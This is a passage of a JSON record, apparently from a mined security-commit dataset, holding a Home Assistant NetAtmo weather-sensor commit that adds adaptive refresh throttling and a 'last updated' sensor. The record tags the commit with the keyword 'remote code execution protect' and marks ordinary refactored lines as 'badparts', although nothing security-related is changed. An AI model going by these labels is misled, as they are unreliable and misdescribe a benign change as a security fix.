data['WindAngle'] elif self.type=='windstrength': self._state=data['WindStrength'] elif self.type=='gustangle_value': self._state=data['GustAngle'] elif self.type=='gustangle': if data['GustAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif self.type=='guststrength': self._state=data['GustStrength'] elif self.type=='rf_status_lvl': self._state=data['rf_status'] elif self.type=='rf_status': if data['rf_status'] >=90: self._state=\"Low\" elif data['rf_status'] >=76: self._state=\"Medium\" elif data['rf_status'] >=60: self._state=\"High\" elif data['rf_status'] <=59: self._state=\"Full\" elif self.type=='wifi_status_lvl': self._state=data['wifi_status'] elif self.type=='wifi_status': if data['wifi_status'] >=86: self._state=\"Low\" elif data['wifi_status'] >=71: self._state=\"Medium\" elif data['wifi_status'] >=56: self._state=\"High\" elif data['wifi_status'] <=55: self._state=\"Full\" class NetAtmoData(object): \"\"\"Get the latest data from NetAtmo.\"\"\" def __init__(self, auth, station): \"\"\"Initialize the data object.\"\"\" self.auth=auth self.data=None self.station_data=None self.station=station def get_module_names(self): \"\"\"Return all module available on the API as a list.\"\"\" self.update() return self.data.keys() @Throttle(MIN_TIME_BETWEEN_UPDATES) def update(self): \"\"\"Call the Netatmo API to update the data.\"\"\" import pyatmo self.station_data=pyatmo.WeatherStationData(self.auth) if self.station is not None: self.data=self.station_data.lastData( station=self.station, exclude=3600) else: self.data=self.station_data.lastData(exclude=3600) ", "sourceWithComments": "\"\"\"\nSupport for the NetAtmo Weather Service.\n\nFor more details about this platform, please refer to the documentation at\nhttps://home-assistant.io/components/sensor.netatmo/\n\"\"\"\nimport logging\nfrom datetime import timedelta\n\nimport voluptuous as vol\n\nfrom homeassistant.components.sensor import PLATFORM_SCHEMA\nfrom homeassistant.const import (\n    TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n    STATE_UNKNOWN)\nfrom homeassistant.helpers.entity import Entity\nfrom homeassistant.util import Throttle\nimport homeassistant.helpers.config_validation as cv\n\n_LOGGER = logging.getLogger(__name__)\n\nCONF_MODULES = 'modules'\nCONF_STATION = 'station'\n\nDEPENDENCIES = ['netatmo']\n\n# NetAtmo Data is uploaded to server every 10 minutes\nMIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n\nSENSOR_TYPES = {\n    'temperature': ['Temperature', TEMP_CELSIUS, None,\n                    DEVICE_CLASS_TEMPERATURE],\n    'co2': ['CO2', 'ppm', 'mdi:cloud', None],\n    'pressure': ['Pressure', 'mbar', 'mdi:gauge', None],\n    'noise': ['Noise', 'dB', 'mdi:volume-high', None],\n    'humidity': ['Humidity', '%', None, DEVICE_CLASS_HUMIDITY],\n    'rain': ['Rain', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_1': ['sum_rain_1', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_24': ['sum_rain_24', 'mm', 'mdi:weather-rainy', None],\n    'battery_vp': ['Battery', '', 'mdi:battery', None],\n    'battery_lvl': ['Battery_lvl', '', 'mdi:battery', None],\n    'min_temp': ['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'max_temp': ['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'windangle': ['Angle', '', 'mdi:compass', None],\n    'windangle_value': ['Angle Value', '\u00ba', 'mdi:compass', None],\n    'windstrength': ['Strength', 'km/h', 'mdi:weather-windy', None],\n    'gustangle': ['Gust Angle', '', 'mdi:compass', None],\n    'gustangle_value': ['Gust Angle Value', '\u00ba', 'mdi:compass', None],\n    'guststrength': ['Gust Strength', 'km/h', 'mdi:weather-windy', None],\n    'rf_status': ['Radio', '', 'mdi:signal', None],\n    'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n    'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n}\n\nMODULE_SCHEMA = vol.Schema({\n    vol.Required(cv.string):\n        vol.All(cv.ensure_list, [vol.In(SENSOR_TYPES)]),\n})\n\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend({\n    vol.Optional(CONF_STATION): cv.string,\n    vol.Optional(CONF_MODULES): MODULE_SCHEMA,\n})\n\n\ndef setup_platform(hass, config, add_devices, discovery_info=None):\n    \"\"\"Set up the available Netatmo weather sensors.\"\"\"\n    netatmo = hass.components.netatmo\n    data = NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None))\n\n    dev = []\n    import pyatmo\n    try:\n        if CONF_MODULES in config:\n            # Iterate each module\n            for module_name, monitored_conditions in\\\n                    config[CONF_MODULES].items():\n                # Test if module exist \"\"\"\n                if module_name not in data.get_module_names():\n                    _LOGGER.error('Module name: \"%s\" not found', module_name)\n                    continue\n                # Only create sensor for monitored \"\"\"\n                for variable in monitored_conditions:\n                    dev.append(NetAtmoSensor(data, module_name, variable))\n        else:\n            for module_name in data.get_module_names():\n                for variable in\\\n                        data.station_data.monitoredConditions(module_name):\n                    if variable in SENSOR_TYPES.keys():\n                        dev.append(NetAtmoSensor(data, module_name, variable))\n                    else:\n                        _LOGGER.warning(\"Ignoring unknown var %s for mod %s\",\n                                        variable, module_name)\n    except pyatmo.NoDevice:\n        return None\n\n    add_devices(dev, True)\n\n\nclass NetAtmoSensor(Entity):\n    \"\"\"Implementation of a Netatmo sensor.\"\"\"\n\n    def __init__(self, netatmo_data, module_name, sensor_type):\n        \"\"\"Initialize the sensor.\"\"\"\n        self._name = 'Netatmo {} {}'.format(module_name,\n                                            SENSOR_TYPES[sensor_type][0])\n        self.netatmo_data = netatmo_data\n        self.module_name = module_name\n        self.type = sensor_type\n        self._state = None\n        self._device_class = SENSOR_TYPES[self.type][3]\n        self._icon = SENSOR_TYPES[self.type][2]\n        self._unit_of_measurement = SENSOR_TYPES[self.type][1]\n        module_id = self.netatmo_data.\\\n            station_data.moduleByName(module=module_name)['_id']\n        self.module_id = module_id[1]\n\n    @property\n    def name(self):\n        \"\"\"Return the name of the sensor.\"\"\"\n        return self._name\n\n    @property\n    def icon(self):\n        \"\"\"Icon to use in the frontend, if any.\"\"\"\n        return self._icon\n\n    @property\n    def device_class(self):\n        \"\"\"Return the device class of the sensor.\"\"\"\n        return self._device_class\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the device.\"\"\"\n        return self._state\n\n    @property\n    def unit_of_measurement(self):\n        \"\"\"Return the unit of measurement of this entity, if any.\"\"\"\n        return self._unit_of_measurement\n\n    def update(self):\n        \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\"\n        self.netatmo_data.update()\n        data = self.netatmo_data.data.get(self.module_name)\n\n        if data is None:\n            _LOGGER.warning(\"No data found for %s\", self.module_name)\n            self._state = STATE_UNKNOWN\n            return\n\n        if self.type == 'temperature':\n            self._state = round(data['Temperature'], 1)\n        elif self.type == 'humidity':\n            self._state = data['Humidity']\n        elif self.type == 'rain':\n            self._state = data['Rain']\n        elif self.type == 'sum_rain_1':\n            self._state = data['sum_rain_1']\n        elif self.type == 'sum_rain_24':\n            self._state = data['sum_rain_24']\n        elif self.type == 'noise':\n            self._state = data['Noise']\n        elif self.type == 'co2':\n            self._state = data['CO2']\n        elif self.type == 'pressure':\n            self._state = round(data['Pressure'], 1)\n        elif self.type == 'battery_lvl':\n            self._state = data['battery_vp']\n        elif self.type == 'battery_vp' and self.module_id == '6':\n            if data['battery_vp'] >= 5590:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5180:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4770:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4360:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4360:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '5':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '3':\n            if data['battery_vp'] >= 5640:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5280:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4920:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4560:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4560:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '2':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'min_temp':\n            self._state = data['min_temp']\n        elif self.type == 'max_temp':\n            self._state = data['max_temp']\n        elif self.type == 'windangle_value':\n            self._state = data['WindAngle']\n        elif self.type == 'windangle':\n            if data['WindAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n        elif self.type == 'windstrength':\n            self._state = data['WindStrength']\n        elif self.type == 'gustangle_value':\n            self._state = data['GustAngle']\n        elif self.type == 'gustangle':\n            if data['GustAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n        elif self.type == 'guststrength':\n            self._state = data['GustStrength']\n        elif self.type == 'rf_status_lvl':\n            self._state = data['rf_status']\n        elif self.type == 'rf_status':\n            if data['rf_status'] >= 90:\n                self._state = \"Low\"\n            elif data['rf_status'] >= 76:\n                self._state = \"Medium\"\n            elif data['rf_status'] >= 60:\n                self._state = \"High\"\n            elif data['rf_status'] <= 59:\n                self._state = \"Full\"\n        elif self.type == 'wifi_status_lvl':\n            self._state = data['wifi_status']\n        elif self.type == 'wifi_status':\n            if data['wifi_status'] >= 86:\n                self._state = \"Low\"\n            elif data['wifi_status'] >= 71:\n                self._state = \"Medium\"\n            elif data['wifi_status'] >= 56:\n                self._state = \"High\"\n            elif data['wifi_status'] <= 55:\n                self._state = \"Full\"\n\n\nclass NetAtmoData(object):\n    \"\"\"Get the latest data from NetAtmo.\"\"\"\n\n    def __init__(self, auth, station):\n        \"\"\"Initialize the data object.\"\"\"\n        self.auth = auth\n        self.data = None\n        self.station_data = None\n        self.station = station\n\n    def get_module_names(self):\n        \"\"\"Return all module available on the API as a list.\"\"\"\n        self.update()\n        return self.data.keys()\n\n    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n    def update(self):\n        \"\"\"Call the Netatmo API to update the data.\"\"\"\n        import pyatmo\n        self.station_data = pyatmo.WeatherStationData(self.auth)\n\n        if self.station is not None:\n            self.data = self.station_data.lastData(\n                station=self.station, exclude=3600)\n        else:\n            self.data = self.station_data.lastData(exclude=3600)\n"}}, "msg": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting"}}, "https://github.com/MoshonkaKita/Golovastik": {"9ea0c409e6cea69cce632079548165ad5a9f2554": {"url": "https://api.github.com/repos/MoshonkaKita/Golovastik/commits/9ea0c409e6cea69cce632079548165ad5a9f2554", "html_url": "https://github.com/MoshonkaKita/Golovastik/commit/9ea0c409e6cea69cce632079548165ad5a9f2554", "message": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting", "sha": "9ea0c409e6cea69cce632079548165ad5a9f2554", "keyword": "remote code execution protect", "diff": "diff --git a/homeassistant/components/sensor/netatmo.py b/homeassistant/components/sensor/netatmo.py\nindex 191e587fe..bdc2c5990 100644\n--- a/homeassistant/components/sensor/netatmo.py\n+++ b/homeassistant/components/sensor/netatmo.py\n@@ -5,7 +5,8 @@\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n@@ -14,7 +15,6 @@\n     TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n@@ -24,8 +24,8 @@\n \n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n@@ -50,7 +50,8 @@\n     'rf_status': ['Radio', '', 'mdi:signal', None],\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n@@ -76,11 +77,11 @@ def setup_platform(hass, config, add_devices, discovery_info=None):\n             # Iterate each module\n             for module_name, monitored_conditions in\\\n                     config[CONF_MODULES].items():\n-                # Test if module exist \"\"\"\n+                # Test if module exists\n                 if module_name not in data.get_module_names():\n                     _LOGGER.error('Module name: \"%s\" not found', module_name)\n                     continue\n-                # Only create sensor for monitored \"\"\"\n+                # Only create sensors for monitored properties\n                 for variable in monitored_conditions:\n                     dev.append(NetAtmoSensor(data, module_name, variable))\n         else:\n@@ -285,6 +286,8 @@ def update(self):\n                 self._state = \"High\"\n             elif data['wifi_status'] <= 55:\n                 self._state = \"Full\"\n+        elif self.type == 'lastupdated':\n+            self._state = int(time() - data['When'])\n \n \n class NetAtmoData(object):\n@@ -296,20 +299,57 @@ def __init__(self, auth, station):\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "files": {"/homeassistant/components/sensor/netatmo.py": {"changes": [{"diff": "\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from datetime import timedelta"], "goodparts": ["from time import time", "import threading"]}, {"diff": "\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n", "add": 0, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from homeassistant.util import Throttle"], "goodparts": []}, {"diff": "\n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n", "add": 2, "remove": 2, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)"], "goodparts": ["NETATMO_UPDATE_INTERVAL = 600"]}, {"diff": "\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]"], "goodparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],", "    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],"]}, {"diff": "\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "add": 46, "remove": 9, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    @Throttle(MIN_TIME_BETWEEN_UPDATES)", "        \"\"\"Call the Netatmo API to update the data.\"\"\"", "        import pyatmo", "        self.station_data = pyatmo.WeatherStationData(self.auth)", "        if self.station is not None:", "            self.data = self.station_data.lastData(", "                station=self.station, exclude=3600)", "        else:", "            self.data = self.station_data.lastData(exclude=3600)"], "goodparts": ["        self._next_update = time()", "        self._update_in_progress = threading.Lock()", "        \"\"\"Call the Netatmo API to update the data.", "        This method is not throttled by the builtin Throttle decorator", "        but with a custom logic, which takes into account the time", "        of the last update from the cloud.", "        \"\"\"", "        if time() < self._next_update or \\", "                not self._update_in_progress.acquire(False):", "            return", "        try:", "            import pyatmo", "            self.station_data = pyatmo.WeatherStationData(self.auth)", "            if self.station is not None:", "                self.data = self.station_data.lastData(", "                    station=self.station, exclude=3600)", "            else:", "                self.data = self.station_data.lastData(exclude=3600)", "            newinterval = 0", "            for module in self.data:", "                if 'When' in self.data[module]:", "                    newinterval = self.data[module]['When']", "                    break", "            if newinterval:", "                newinterval += NETATMO_UPDATE_INTERVAL - time()", "                if newinterval > NETATMO_UPDATE_INTERVAL - 30:", "                    newinterval = NETATMO_UPDATE_INTERVAL", "                else:", "                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:", "                        newinterval = NETATMO_UPDATE_INTERVAL / 2", "                    _LOGGER.warning(", "                        \"NetAtmo refresh interval reset to %d seconds\",", "                        newinterval)", "            else:", "                newinterval = NETATMO_UPDATE_INTERVAL", "            self._next_update = time() + newinterval", "        finally:", "            self._update_in_progress.release()"]}], "source": "\n\"\"\" Support for the NetAtmo Weather Service. For more details about this platform, please refer to the documentation at https://home-assistant.io/components/sensor.netatmo/ \"\"\" import logging from datetime import timedelta import voluptuous as vol from homeassistant.components.sensor import PLATFORM_SCHEMA from homeassistant.const import( TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE, STATE_UNKNOWN) from homeassistant.helpers.entity import Entity from homeassistant.util import Throttle import homeassistant.helpers.config_validation as cv _LOGGER=logging.getLogger(__name__) CONF_MODULES='modules' CONF_STATION='station' DEPENDENCIES=['netatmo'] MIN_TIME_BETWEEN_UPDATES=timedelta(seconds=600) SENSOR_TYPES={ 'temperature':['Temperature', TEMP_CELSIUS, None, DEVICE_CLASS_TEMPERATURE], 'co2':['CO2', 'ppm', 'mdi:cloud', None], 'pressure':['Pressure', 'mbar', 'mdi:gauge', None], 'noise':['Noise', 'dB', 'mdi:volume-high', None], 'humidity':['Humidity', '%', None, DEVICE_CLASS_HUMIDITY], 'rain':['Rain', 'mm', 'mdi:weather-rainy', None], 'sum_rain_1':['sum_rain_1', 'mm', 'mdi:weather-rainy', None], 'sum_rain_24':['sum_rain_24', 'mm', 'mdi:weather-rainy', None], 'battery_vp':['Battery', '', 'mdi:battery', None], 'battery_lvl':['Battery_lvl', '', 'mdi:battery', None], 'min_temp':['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'max_temp':['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'windangle':['Angle', '', 'mdi:compass', None], 'windangle_value':['Angle Value', '\u00ba', 'mdi:compass', None], 'windstrength':['Strength', 'km/h', 'mdi:weather-windy', None], 'gustangle':['Gust Angle', '', 'mdi:compass', None], 'gustangle_value':['Gust Angle Value', '\u00ba', 'mdi:compass', None], 'guststrength':['Gust Strength', 'km/h', 'mdi:weather-windy', None], 'rf_status':['Radio', '', 'mdi:signal', None], 'rf_status_lvl':['Radio_lvl', '', 'mdi:signal', None], 'wifi_status':['Wifi', '', 'mdi:wifi', None], 'wifi_status_lvl':['Wifi_lvl', 'dBm', 'mdi:wifi', None] } MODULE_SCHEMA=vol.Schema({ vol.Required(cv.string): vol.All(cv.ensure_list,[vol.In(SENSOR_TYPES)]), }) PLATFORM_SCHEMA=PLATFORM_SCHEMA.extend({ vol.Optional(CONF_STATION): cv.string, vol.Optional(CONF_MODULES): MODULE_SCHEMA, }) def setup_platform(hass, config, add_devices, discovery_info=None): \"\"\"Set up the available Netatmo weather sensors.\"\"\" netatmo=hass.components.netatmo data=NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None)) dev=[] import pyatmo try: if CONF_MODULES in config: for module_name, monitored_conditions in\\ config[CONF_MODULES].items(): if module_name not in data.get_module_names(): _LOGGER.error('Module name: \"%s\" not found', module_name) continue for variable in monitored_conditions: dev.append(NetAtmoSensor(data, module_name, variable)) else: for module_name in data.get_module_names(): for variable in\\ data.station_data.monitoredConditions(module_name): if variable in SENSOR_TYPES.keys(): dev.append(NetAtmoSensor(data, module_name, variable)) else: _LOGGER.warning(\"Ignoring unknown var %s for mod %s\", variable, module_name) except pyatmo.NoDevice: return None add_devices(dev, True) class NetAtmoSensor(Entity): \"\"\"Implementation of a Netatmo sensor.\"\"\" def __init__(self, netatmo_data, module_name, sensor_type): \"\"\"Initialize the sensor.\"\"\" self._name='Netatmo{}{}'.format(module_name, SENSOR_TYPES[sensor_type][0]) self.netatmo_data=netatmo_data self.module_name=module_name self.type=sensor_type self._state=None self._device_class=SENSOR_TYPES[self.type][3] self._icon=SENSOR_TYPES[self.type][2] self._unit_of_measurement=SENSOR_TYPES[self.type][1] module_id=self.netatmo_data.\\ 